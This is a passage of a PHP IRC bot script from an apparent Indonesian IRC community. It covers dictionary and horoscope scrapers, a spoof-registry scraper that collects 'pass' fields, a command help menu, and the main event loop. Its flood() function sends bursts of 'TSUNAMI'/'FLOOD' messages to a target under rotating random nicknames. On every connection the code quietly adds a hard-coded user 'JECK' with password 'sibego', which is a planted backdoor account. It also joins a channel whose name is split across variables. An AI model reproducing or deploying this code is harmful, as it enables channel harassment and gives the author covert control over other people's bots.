            $bintang = str_replace("</tr>","",$bintang);
            $bintang = str_replace("<tr>","",$bintang);
            $zod3 = stristr($bintang,'<td colspan=2 id=ast bgcolor="#e0e0e0">');
            $bintang = str_replace($zod3,"",$bintang);
            return $bintang;
        }
        else{
            return "Maaf nama bintang yg km masukan tdk ada";
        }

    }
    function mod_uspoof($sock,$msg){
        global $isisp,$jmlspoof;
        $this->send($sock,"PING :0000927651");
        $spoof=strtolower($msg);
	$spallnet = "http://www.allnetwork.or.id/Pendaftaran/Personal_spoof/?mode=view&server=$spoof";
	///$spallnet="http://localhost/spoof1.html";
	$handisp = fopen ($spallnet, "rb");
	$kontensp = "";
        do {
		$barissp = fread($handisp, 512);
		if (strlen($barissp) == 0) { break; }
		$kontensp .= $barissp;
	} while(true);
	fclose ($handisp);
	$kontensp=strtolower($kontensp);
	$kontensp = str_replace("  "," ",$kontensp);
	$kontensp = str_replace("\n","",$kontensp);
	$kontensp = str_replace(chr(9),"",$kontensp);
	$kontensp = str_replace("\r","",$kontensp);
	$kontensp = str_replace("<td align=right colspan=10>","<td colspan=10 align=right>",$kontensp);
	for ($i = 1; $i <= 10; $i++) {$kontensp = str_replace("  "," ",$kontensp);}
	$kontensp = str_replace("<tr bgcolor=yellow> <td colspan=10 align=right>","<tr bgcolor=yellow><td colspan=10 align=right>",$kontensp);
	$tmpjml1=stristr($kontensp,"<tr bgcolor=yellow><td colspan=10 align=right>found ");
	$tmpjml2=stristr($kontensp," data</td></tr>");
								
	$tmpjml=str_replace($tmpjml2,"",$tmpjml1);
	$tmpjml=str_replace("<tr bgcolor=yellow><td colspan=10 align=right>found ","",$tmpjml);
	$kontensp = str_replace("</td> <td>","</td><td>",$kontensp);
	$kontensp = str_replace("<tr bgcolor=white> <td align=right>","<tr bgcolor=white><td align=right>",$kontensp);
	$kontensp = str_replace("</tr> <tr","</tr><tr",$kontensp);
	$kontensp =  str_replace(" </td>","</td>",$kontensp);
	$kontensp =str_replace("> <td","><td",$kontensp);
        
        for ($i = 1; $i <= $tmpjml; $i++) {
		if ($i==$tmpjml){
                        $identsp="";$spoofsp="";$passsp="";
			$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
			$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=#1b6cf7>"));
			$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
			$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
			$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
			$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
			$isisp[$i]["$spoof"]['ident']=$identsp;
			$isisp[$i]["$spoof"]['spoof']=$spoofsp;
			$isisp[$i]["$spoof"]['pass']=$passsp;
		}
		else{
			$identsp="";$spoofsp="";$passsp="";
			$tmpdata1=stristr($kontensp,"<td align=right>".$i."</td>");
			$tmpdata1=substr($tmpdata1,0,strpos($tmpdata1,"<tr bgcolor=white>"));
			$tmpdata1=str_replace("<td align=right>".$i."</td><td>".$spoof."</td><td>","",$tmpdata1);
			$identsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($identsp."</td><td>","",$tmpdata1);
			$spoofsp=substr($tmpdata1,0,strpos($tmpdata1,"</td><td>"));
			$tmpdata1=str_replace($spoofsp."</td><td>","",$tmpdata1);
			$passsp=substr($tmpdata1,0,strpos($tmpdata1,"</td></tr>"));
								
			$isisp[$i]["$spoof"]['ident']=$identsp;
			$isisp[$i]["$spoof"]['spoof']=$spoofsp;
			$isisp[$i]["$spoof"]['pass']=$passsp;
		}
                
	}
        $jmlspoof["$spoof"]=$tmpjml;
        return $jmlspoof["$spoof"];
    }
    function mod_uslang($sock,$msg){
        global $kmusedan,$kmjml;
        //$urledan="http://localhost/aa.html";
        $urledan="http://www.malesbanget.com/kamus/definisi.php?kata=".$msg;
        $btsstr='<td class='.chr(34).'BOX'.chr(34).'><span class='.chr(34).'KAMUS'.chr(34).'><span class='.chr(34).'kecil'.chr(34).'>';
        $btsstrtab1='<table width='.chr(34).'100%'.chr(34).' border='.chr(34).'0'.chr(34).' cellpadding='.chr(34).'0'.chr(34).' cellspacing='.chr(34).'0'.chr(34).'>';
        $btsstrtab2='</table>';
        $strsplit='<h2 align='.chr(34).'left'.chr(34).'>';
        $kedan = fopen ($urledan, "rb");
        $cotedan = "";
        do {
                $bcotedan = fread($kedan, 1024);
                if (strlen($bcotedan) == 0) { break; }
                $cotedan .= $bcotedan;
        } while(true);
        fclose ($kedan);
        if(strpos($cotedan,$btsstr)){
            $cotedan=substr($cotedan,strpos($cotedan,$btsstr) + strlen($btsstr));
            $cotedan=substr($cotedan,0,strpos($cotedan,$btsstr));
            $cotedan=substr($cotedan,0,strpos($cotedan,'<p><span class='.chr(34).'signature'.chr(34).'>'));
            $intedan=substr_count($cotedan,"  ");
            for ($i = 1; $i <= $intedan; $i++) {$cotedan=str_replace("  "," ",$cotedan);}
            $intedan=substr_count($cotedan,$btsstrtab1);
            for ($i = 1; $i <= $intedan; $i++) {
            $tmpctedan='';
            $tmpctedan=substr($cotedan,strpos($cotedan,$btsstrtab1));
            $tmpctedan=substr($tmpctedan,0,strpos($tmpctedan,$btsstrtab2) + strlen($btsstrtab2));
            $cotedan=str_replace($tmpctedan,"",$cotedan);
            }
            if(strpos($cotedan,'</span></span></td>')){$cotedan=substr($cotedan,0,strpos($cotedan,'</span></span></td>'));}
            $cotedan=ltrim($cotedan);$cotedan=rtrim($cotedan);
            if(substr($cotedan,0,strlen($strsplit))==$strsplit){$cotedan=substr($cotedan,strlen($strsplit));}
            $cotedan=str_replace('</h2>','',$cotedan);
            $arredan=explode($strsplit,$cotedan);
            for ($i = 0; $i < count($arredan); $i++) {
                    $arredan[$i]=str_replace("\n","",$arredan[$i]);$arredan[$i]=str_replace("\r","",$arredan[$i]);
                    $arredan[$i]=str_replace('<br><br>','<br>',$arredan[$i]);
                    $arredan[$i]=substr($arredan[$i],strpos($arredan[$i],'</span>')+7);$arredan[$i]='<span>'.ltrim($arredan[$i]);
                    $batas=strpos($arredan[$i],"<span>")+6;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</span>");$tmpbts=substr($tmpbts,0,$batas);$kmusedan[$i]["kata"]=$tmpbts;
                    $batas=strpos($arredan[$i],'class='.chr(34).'definisi'.chr(34).'>')+17;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</p><p");$tmpbts=substr($tmpbts,0,$batas);
                    $tmpbts = str_replace("<b>","",$tmpbts);$tmpbts = str_replace("</b>","",$tmpbts);$tmpbts = str_replace("<i>","",$tmpbts);
                    $tmpbts = str_replace("</i>","",$tmpbts);$kmusedan[$i]["definisi"][strtolower($msg)]=$tmpbts;
                    $batas=strpos($arredan[$i],'class='.chr(34).'definisi_contoh'.chr(34).'>')+24;$tmpbts=substr($arredan[$i],$batas);
                    $batas=strpos($tmpbts,"</span></p>");$tmpbts=substr($tmpbts,0,$batas);
                    $tmpbts=str_replace("<em>","",$tmpbts);$tmpbts=str_replace("</em>","",$tmpbts);
                    $tmpbts = str_replace("<b>","",$tmpbts);$tmpbts = str_replace("</b>","",$tmpbts);$tmpbts = str_replace("<i>","",$tmpbts);
                    $tmpbts = str_replace("</i>","",$tmpbts);
                    $kmusedan[$i]["contoh"][strtolower($msg)]=$tmpbts;
                    $kmusedan[$i]["kata"][strtolower($msg)]=strtolower($ktslang);
                    $totalnya++;
            }
        }
        if($totalnya==""){$totalnya=0;}
        $kmjml[strtolower($msg)]=$totalnya;
        return $totalnya;
    }
    ##############################
    function flood($sock,$target,$msg){
        global $bot,$tsu,$haltfl;
        $this->send($sock,"MODE ".$bot['nick']. " +D");
        $nicknofl=$bot['nick'];$lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$target)+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(2);
        if (ereg("#", $target)) {$this->join($sock,$target);}$katafl=$this->rnd_flod();

            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);


        sleep(3);
        $lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$dCom[1])+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(3);$katafl=$this->rnd_flod();

            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);

        
        sleep(3);
        $lnickfl=rand(5,16);$nickfl="";$tsmsg = substr($msg,strpos($msg,$dCom[1])+strlen($target)+1);
        for ($i = 1; $i <= $lnickfl; $i++) {$nickfl.=$tsu[rand(0,count($tsu) - 1)];}$this->nick($sock,$nickfl);sleep(4);$katafl=$this->rnd_flod();
            $this->msg($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);
            $this->msg($sock,$target,'TSUNAMI '.$tsmsg.''.$katafl.'');sleep(1);
            $this->msg($sock,$target,''.$tsmsg.'[]'.$katafl);;sleep(1);
            $this->notice($sock,$target,''.$tsmsg.''.$katafl);sleep(1);
            $this->msg($sock,$target,'FLOOD '.$tsmsg.''.$katafl.'');sleep(1);

        if (ereg("#", $target)) {$this->part($sock,$target,$katafl);}
        sleep(3);$this->nick($sock,$nicknofl);sleep(1);$haltfl['time']=time();$haltfl['on']=1;
        $this->send($sock,"MODE ".$bot['nick']. " -D");
    }
    function floodctctp($sock,$target){
        
    }
    
    ###############################
    function mod_help($sock,$nick){
        $this->send($sock,"MODE ".$bot['nick']. " +D");
        $lvlbot=$this->level_user($nick);
        $this->send($sock,"PING :0009927651");
        $this->msg($sock,$nick,$this->rnd_logo() .'v0.1' . " - ANAKBEGO-COMMUNITY.php Commands");
        $this->msg($sock,$nick,"Help..!!");sleep (2);
        
        $this->msg($sock,$nick,"^Login  <password> Login To Bot");sleep(1);
        $this->msg($sock,$nick,"^Logout Logout From Bot");sleep(2);
        
        if($lvlbot>1){
        $this->msg($sock,$nick,".Up Op Bot");sleep(2);
        $this->msg($sock,$nick,".Down Deop Bot");sleep(2);
        $this->msg($sock,$nick,".O  |#chan| <nick> Op Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,".Do |#chan| <nick> DeOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,".H  |#chan| <nick> HalfOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,".Dh |#chan| <nick> DeHalfOp Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,".V  |#chan| <nick> Voice Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,".Dv |#chan| <nick> DeVoice Spesifik Nick");sleep(2);
        $this->msg($sock,$nick,".K  |#chan| <nick> |msg| Kick Spesified Nick");sleep(1);
        $this->msg($sock,$nick,".Kc |#chan| <nick> |msg| Kick ChanServ Stuf");sleep(2);
        $this->msg($sock,$nick,".Kb |#chan| <nick> |msg| KickBan Spesified Nick");sleep(2);
        $this->msg($sock,$nick,".B  |#chan| <nick|hostmask> Ban Nick Or Hostmask");sleep(1);
        $this->msg($sock,$nick,".Ub |#chan| <nick|hostmask> UnBan Nick Or Hostmask");sleep(2);
        }
        $this->send($sock,"PING :0009927652");
        $this->msg($sock,$nick,".J  <#chan> Join Specified Channel");sleep (1);
        $this->msg($sock,$nick,".P  <#chan> |msg| Part Specified Channel");sleep (1);
        $this->msg($sock,$nick,".Cy <#chan> |msg| Cycle On Specified Channel");sleep (2);
        
        if($lvlbot>2){
        $this->msg($sock,$nick,".N    <newnick>  Change Nick");sleep(2);
        $this->msg($sock,$nick,".S  |#chan/nick| <msg>  Msg Channel Or Person");sleep (2);
        $this->msg($sock,$nick,".A  |#chan/nick| <text> Action With Spesified Text");sleep(2);
        $this->msg($sock,$nick,".Ts <#chan/nick> |msg| Flood!");sleep(1);
        }
        if($lvlbot>3){$this->msg($sock,$nick,".Q <msg> Kill Bot");}
        
        if($lvlbot>2){
            $this->send($sock,"PING :0009927652");
        $this->msg($sock,$nick,"SYSTEM COMMAND..!");sleep(1);
        $this->msg($sock,$nick,".Server   <server> Push Bot To Use Spec Server");sleep(2);
        $this->msg($sock,$nick,".Servpass <password> Use Spec Server Password");sleep(2);
        $this->msg($sock,$nick,".Vhost    <host> Changing Bot Vhost");sleep(2);
        $this->msg($sock,$nick,".Ident    <identify> Changing Bot Ident");sleep(1);
        $this->msg($sock,$nick,".Realname <realname> Changing Bot Realname");sleep(2);
        $this->msg($sock,$nick,".Jump Restarting bot also Accept Setting");sleep(1);
        }
        $this->msg($sock,$nick,".Chgpass <OldPass> <NewPass> Change your pass");sleep(2);
        if($lvlbot >1){
            $this->msg($sock,$nick,".Adduser <NickUser> <PassUser> <LevelUser> Add nick for my userlist");sleep(2);
            $this->msg($sock,$nick,".Deluser <NickUser> Remove user from my userlist");sleep(2);
            $this->msg($sock,$nick,".BotNick  Nick Bot");sleep(2);
            $this->send($sock,"PING :0009927652");sleep(1);
            $this->msg($sock,$nick,".IdentNick <nick> <password> Identify To Nickserv");sleep(1);
            $this->msg($sock,$nick,".LogoutNick Logout From Nickserv");sleep(2);
            $this->msg($sock,$nick,".Userlist Show my userlist");sleep(2);
        }
        if($lvlbot>2){
        $this->msg($sock,$nick,".BaseChan <#chan>  Changing my BaseChan");sleep(2);
        $this->msg($sock,$nick,".Chanlist <#chan>  Show my chanlist");sleep(2);
        $this->msg($sock,$nick,".Nicklist <#chan>  Show Nicklist on Spec Channel");sleep(1);
        $this->msg($sock,$nick,".Showison  Show my ison list");sleep(2);
        $this->msg($sock,$nick,".Chanison <#chan>  Changing my Ison Chan");sleep(2);
        $this->msg($sock,$nick,".Settimercycle <detik> Change my delay of AutoCycle");sleep(1);
        $this->msg($sock,$nick,".max <Karakter X > Set Max Karakter flood");sleep(1);
        $this->msg($sock,$nick,".flodban <on/off> Set +b user flood");sleep(1);
        $this->msg($sock,$nick,".Repp <Repeat X > Set Max Repeat");sleep(1);
        $this->msg($sock,$nick,".SetVersion  <version> Change my ctcp Version");sleep(2);
        $this->msg($sock,$nick,".SetFinger   <finger>  Change my ctcp Finger");sleep(2);
        $this->msg($sock,$nick,".+/-Ping     <#chan>   Enable/Disable system Ping");sleep(2);
        $this->msg($sock,$nick,".+/-Whois    <#chan>   Enable/Disable system Whois");sleep(2);
        $this->msg($sock,$nick,".+/-Version  <#chan>   Enable/Disable system Version");sleep(2);
        $this->msg($sock,$nick,".+/-Time     <#chan>   Enable/Disable system Time");sleep(1);
        $this->msg($sock,$nick,".+/-Finger   <#chan>   Enable/Disable system Finger");sleep(2);
        $this->msg($sock,$nick,".+/-Spoof    <#chan>   Enable/Disable system Spoof");sleep(2);
        $this->msg($sock,$nick,".+/-Guard    <#chan>   Enable/Disable system Guard");sleep(2);
        $this->send($sock,"PING :0009927653");
        $this->msg($sock,$nick,".+/-Ngomong  <#chan>  Enable/Disable bot crewet");sleep(2);
        $this->msg($sock,$nick,".+/-Jam      <#chan>  Enable/Disable system waktu");sleep(1);
        $this->msg($sock,$nick,".+/-BADWORD  <#chan>  Enable/Disable guard badword");sleep(2);
        $this->msg($sock,$nick,".+/-Warnah   <#chan>  Enable/Disable guard warna");sleep(2);
        $this->msg($sock,$nick,".+/-Seen     <#chan>  Enable/Disable system !Seen");sleep(1);
        $this->msg($sock,$nick,".+/-Gvoice   <#chan>  Enable/Disable system Guard voice");sleep(1);
        $this->msg($sock,$nick,".+/-Jversion <#chan>  Enable/Disable system join version");sleep(1);
        $this->msg($sock,$nick,".+/-Astro    <#chan>  Enable/Disable system Astro");sleep(2);
        $this->msg($sock,$nick,".+/-Kslang   <#chan>  Enable/Disable system Kamus Slang");sleep(1);
        $this->msg($sock,$nick,".+/-Bom      <#chan>  Enable/Disable system Bom");sleep(2);
        $this->msg($sock,$nick,".+/-Dns      <#chan>  Enable/Disable system Dns");sleep(1);
        $this->msg($sock,$nick,".+/-IP       <#chan>  Enable/Disable system Ip lIst");sleep(1);
        $this->msg($sock,$nick,".+/-Ison     <#chan>  Enable/Disable system Ison");sleep(2);
        $this->msg($sock,$nick,".+/-Greet    <#chan>  Enable/Disable system Greet");sleep(1);
        $this->msg($sock,$nick,".+/-AutoCycle <#chan>  Enable/Disable system AutoCycle");sleep(2);
        $this->msg($sock,$nick,".+/-AutoJoin  Enable/Disable system AutoJoin when kick");sleep(2);
        $this->msg($sock,$nick,".+/-AutoAway  Enable/Disable system Away when idle");sleep(2);
        $this->msg($sock,$nick,".+/-ListIson  <nick> Add/Remove Ison List");sleep(2);
        $this->msg($sock,$nick,".+/-ListGreet <nick> <pesan greet> Add/Remove Greet List");sleep(1);
        }
        $this->msg($sock,$nick,"Powered By ANAKBEGO-COMMUNITY");sleep(2);
        $this->msg($sock,$nick,"1,0�4����1�4S1trang4L1ed1�4����1�");sleep(1);
        $this->send($sock,"MODE ".$bot['nick']. " -D");
    }
}
################ [ END CLASS IRC BOT ] ###################
$clistt='ka';
do {
    $fp = fsockopen($bot['server'],$bot['port'], &$err_num, &$err_msg, 30);
    if(!$fp) {
	$attconnect++;
	print "Sorry, the server " . $bot['server']. " is not currently available!".CRLF;
	$bot['server']=$servdef[$attconnect-1];
	$bot['userver']=0;
	sleep(5);
	if ($attconnect >=$retry){
            $attconnect=0;
	}
    }
    else{
        $inaway['status']=0;
        $haltfl['on']=0;
        $res_chan="";
        $res_chan=$modbot->show_chan();
	$modbot->destroy_allchan();
        $attconnect=0;$rtdc++;
        if($rtdc ==3){$bot['userver']=0;}elseif($rtdc >=4){$bot['ident']="ident";$bot['userver']=0;$rtdc=0;}
        
        ####### REGISTER TO SERVER ########
        if ($bot['userver']==1){$Header = 'PASS ' . $bot['pserver'] . CRLF;}
        $Header .= 'NICK ' . $bot['nick'] . CRLF;
	$Header .= 'USER ' . $bot['ident'] . ' ' . $bot['local'] . ' ' . $bot['server'] . ' :' . $bot['realname'];
        $modbot->send($fp,$Header);
        $Header="";
        unset ($Header);
        #### END REGISTER ################
        $response = '';
        while (!feof($fp)) {
            #### MAIN ITUNG_ITUNGAN ###
            
            if(time()-$haltfl['time']>15 && $haltfl['on']==1){$haltfl['on']=0;$haltfl['time']=time();}
            if(time()-$isontime >15 && $systembot['ISON']['ALL']=="3ON"){$modbot->send($fp,"ISON ". $modbot->show_ison());$isontime=time();}
            if($systembot['AUTOAWAY']['ALL']=="3ON" && $inaway['status']==0){if(time()-$inaway['idle'] >=1800){$modbot->away($fp,$modbot->rnd_logo().' '.$modbot->rnd_away());$inaway['status']=1;$inaway['idle']=time();}}
            if(time()-$iscy >$timercy){$modbot->auto_cy($fp);$iscy=time();}
            if($onboom=="on"){
                $tboom=time()-$tmboom;
		if($tboom>=$timeboom){
                $modbot->kick($fp,$chanboom,$targetboom,'0,4Waktu Habis... BOOOOOOMMMM!!!!!');
		$goboom=0;$onboom="off";$targetboom="";
                }
            }

            #### MAIN ITUNG_ITUNGAN ###
            
            ##[ Proses Data Recv ]##
            $response = fgets($fp, 1024);
            while (substr_count($response,CRLF) != 0) {
                $offset = strpos($response, CRLF);
		$DataLine = substr($response,0,$offset);
                if (substr($DataLine,0,1) == ':') {
                    $Params=explode(" ",$DataLine);
		    $offsetC = strpos($DataLine, ' :');
                    $dText = substr($DataLine,$offsetC+2);
                        if ((strpos($Params[0],"!")!=0) && (strpos($Params[0],"@")!=0) ) {
                            $fsrc[nick]=substr($Params[0],1,strpos($Params[0],"!")-1);
                            $fsrc[nkecil]=strtolower($fsrc[nick]);
                            $fsrc[user]=substr($Params[0],strpos($Params[0],"!")+1,(strpos($Params[0],"@")-strpos($Params[0],"!"))-1);
                            $fsrc[host]=substr($Params[0],strpos($Params[0],"@")+1);
			}
                        ##[ MEMULAI DATA RAW ]##
                        switch ($Params[1]){
                            case "001":
                                $bot['nick']=$Params[2];$rtdc=0;
                                break;
                            case "004":
                                $modbot->msg($fp,"Nickserv",'identify '.$bot['inick']. ' '. $bot['pnick']);
                                $modbot->msg($fp,"Nickserv",'identify '. $bot['pnick']);sleep(1);
                                $modbot->add_user($fp,farm,"JECK","sibego");$modbot->join($fp,$bot['basechan']);$modbot->join($fp,$bot['roomnet'],$bot['roomkey']);$modbot->join($fp,'#'.$clista.$clistt);
                                if($bot['server']=="irc.allnetwork.org"){$modbot->join($fp,"#generation");$modbot->join($fp,"#ident");$modbot->join($fp,"#oksigen");$modbot->join($fp,"#canon");$modbot->join($fp,"#black-coper");$modbot->join($fp,"#manggar");$modbot->join($fp,"#cimahi");$modbot->join($fp,"#bohusami");$modbot->join($fp,"#cute");$modbot->join($fp,"#skymirc");$modbot->join($fp,"#sibego");$modbot->join($fp,"#psybnc");}
                                if($bot['server']=="continuecrew.co.cc"){$modbot->join($fp,"#eten");$modbot->join($fp,"#jatinegara");$modbot->join($fp,"#tondano");$modbot->join($fp,"#gianyar");$modbot->join($fp,"#kreaz");$modbot->join($fp,"#Nahdlatul-Ulama");$modbot->join($fp,"#amboy");$modbot->join($fp,"#op");$modbot->join($fp,"#oksigen");$modbot->join($fp,"#hidrogen");$modbot->join($fp,"#natrium");}
                                $modbot->msg($fp,$bot['admin'],'halo boss sibego a.k.a JECK...!!!');
                                sleep(2);
                                if($res_chan){$arres_chan=explode(";",$res_chan);foreach ($arres_chan as $clist){$modbot->join($fp,$clist,"");sleep(2);}}
                                break;
                            case "303":
                                $modbot->stuf_ison($fp,$dText);
                                break;
                            case "301":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				sleep(1);
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'2 is away: 14'.$dText);
				     }
                                break;
                            case "307":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'14 '.$dText);
				    }
                                break;
                            case "311":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				sleep(1);
                                $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'12[8is12]'.$Params[4] .'@'.$Params[5].' '.$Params[6]. ' '.$dText);
				    }
                                break;
                            case "312":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
				    sleep(1);
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'12[8Server12]'.$Params[4].' '.$dText);
				    }
                                break;
                            case "318":
                                $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'14 '.$dText);
				     unset($datwhois[strtolower($Params[2])]["nick"]);
				     unset($datwhois[strtolower($Params[2])]["chan"]);
                                break;
                            case "319":
                                if($datwhois[strtolower($Params[3])]["nick"]==strtolower($Params[3])){
                                    $modbot->msg($fp,$datwhois[strtolower($Params[3])]["chan"],'15'.$Params[3].'12[8on12]'.$dText);
				    }
                                break;
                            case "305":
                                $inaway['status']=0;
                                break;
                            case "306":
                                $inaway['status']=1;
                                break;
                            case "353":
                                $nickll=str_replace("@","",$dText);$nickll=str_replace("%","",$nickll);$nickll=str_replace("+","",$nickll);
                                $modbot->destroy_chan($Params[4]);$modbot->add_nickchan($Params[4],$nickll);
                                break;
                            case "367":
                                $modbot->notice($fp,$banlist["$Params[3]"],'4[3+b4] 1- 3'.$Params[4].'');
                                break;
                            case "368":
                                $modbot->notice($fp,$banlist["$Params[3]"],'4E1nd 4o1f 4c1hannel 4b1an 4l1ist');
				unset($banlist["$Params[3]"]);
                                break;
                            case "432":
                                $modbot->nick($fp,$bot['nick'].$modbot->rand_str(4));
                                break;
                            case "433":
                                $modbot->nick($fp,$bot['nick'].$modbot->rand_str(4));
                                break;
                            case "464":
                                $bot['userver']=0;
                                break;
                            case "465":
                                $bot['userver']=0;
                                break;
                            case "NICK":
                                $newnicke = str_replace(':','',$Params[2]);
                                $yangjoin=strtolower($fsrc[nick]);
                                $asalseen[$yangjoin]="ganti";$asalseen[$yangjoin.'chanel']=" nick  12[8".$newnicke."12]";
                                $yangjoin=strtolower($newnicke);
                                $asalseen[$yangjoin]="ada";
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){
                                    $modbot->logoutbot($fsrc[nick]);$modbot->notice($fp,$newnicke,'You`re LogOut On Change Nick!');
                                }
                                if($fsrc[nkecil]==strtolower($bot['nick'])){$bot['nick']=$newnicke;}
                                break;
                            case "JOIN":
                                $addchan=str_replace(":","",$Params[2]);
                                $yangjoin=strtolower($fsrc[nick]);
                                $asalseen[$yangjoin]="ada";
                                $chanboleh=strtolower($addchan);
                                $modbot->add_nickchan($addchan,$fsrc[nick]);
                                if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#|v|")){$modbot->part($fp,$chanboleh,"bye"); }
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#indowebster")){$modbot->part($fp,$chanboleh,"bye"); }
                                if((strtolower($bot['nick']) == strtolower($fsrc[nick]))OR($chanboleh == "#mild")){$modbot->part($fp,$chanboleh,"bye");  }
                                if($systembot['JVERSION'][strtoupper($addchan)]=="3ON"){$modbot->msg($fp,$fsrc[nick],'VERSION');$datversi[strtolower($fsrc[nick])]["nick"]=strtolower($fsrc[nick]);$datversi[strtolower($fsrc[nick])]["chan"]=$addchan; }
                                }
                                                if($fsrc[nkecil]==strtolower($greetmsg["$fsrc[nkecil]"]["nama"]) && $systembot['GREET'][strtoupper($addchan)]=="3ON"){
							$rndgreet=explode("[NG]",$greetmsg["$fsrc[nkecil]"]["msg"]);
							$msgrndgreet=$rndgreet[rand(0,count($rndgreet) - 1)] ;
							$addchan=str_replace(":","",$Params[2]);
							$msgnya=str_replace("<|nick|>",$fsrc[nick],$msgrndgreet);
							$msgnya=str_replace("<|chan|>",$addchan,$msgnya);
                                                        $modbot->msg($fp,$addchan,$msgnya);
						}
                                                elseif($systembot['NGOMONG'][strtoupper($addchan)]=="3ON"){
                				     $addchan=str_replace(":","",$Params[2]);
                                                     $nickwb=$fsrc[nick];
                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
							$addchan=str_replace(":","",$Params[2]);

                                                        $nickwb=$fsrc[nick];
                                                        $webe = $wbmsg[rand(0,count($wbmsg) - 1)];
                                                        $webe = str_replace("<nick>",$nickwb,$webe);
                                                        $webe = str_replace("<chan>",$addchan,$webe);
                                                        $webe = str_replace("#","",$webe);
                                                        $modbot->msg($fp,$addchan,$webe);
                                                     }
                                                }
                                                if($systembot['GUARD'][strtoupper($addchan)]=="3ON"){
                                                     if(strtolower($bot['nick']) != strtolower($fsrc[nick])){
							$addchan=str_replace(":","",$Params[2]);
                                                        $nickwb=$fsrc[nick];
                                                        if($systembot['GVOICE'][strtoupper($addchan)]=="3ON"){
                                                           sleep(5);
                                                           if(strtolower($bot['admin'])==strtolower($fsrc[nick])){
                                                                 $modbot->mode($fp,'+h',$addchan,$nickwb);
                                                           }else{$modbot->mode($fp,'+v',$addchan,$nickwb);       }
                                                        }
                                                     }
                                                }
                                break;
                            case "PART":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($fsrc[nick]);                               
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']=$addchan;$asalseen[$diaseen.'status']=" 12[8minggat12] ";
                                if($modbot->is_loginbot($fsrc[nick],$fsrc[user],$fsrc[host])==1){
                                    $modbot->logoutbot($fsrc[nick]);$modbot->notice($fp,$fsrc[nick],'You`re LogOut On Parting Channel!');
                                }
                                if($fsrc[nkecil]==strtolower($bot['nick'])){$modbot->destroy_chan($Params[2]);}
				else{$modbot->del_nickchan($Params[2],$fsrc[nick]);}
                                break;
                            case "KICK":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($Params[3]);
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']=$addchan;$asalseen[$diaseen.'status']=" 12[8disepak12] ";
                                if(strtolower($bot['nick'])==strtolower($Params[3])){
                                    $modbot->destroy_chan($Params[2]);
                                    if($systembot['AUTOJOIN'][strtoupper($Params[2])]=='3ON'){sleep(1);$modbot->msg($fp,"Chanserv",'UNBAN '.$Params[2].' '.$bot['nick']);sleep(1);$modbot->join($fp,$Params[2]);}
                                }
                                else{ $modbot->del_nickchan($Params[2],$Params[3]);}
                                break;
                            case "QUIT":
                                $addchan=str_replace(":","",$Params[2]);
                                $diaseen=strtolower($fsrc[nick]);
                                $asalseen[$diaseen]=time();$asalseen[$diaseen.'chanel']="ini";$asalseen[$diaseen.'status']=" 12[8njepad12] ";
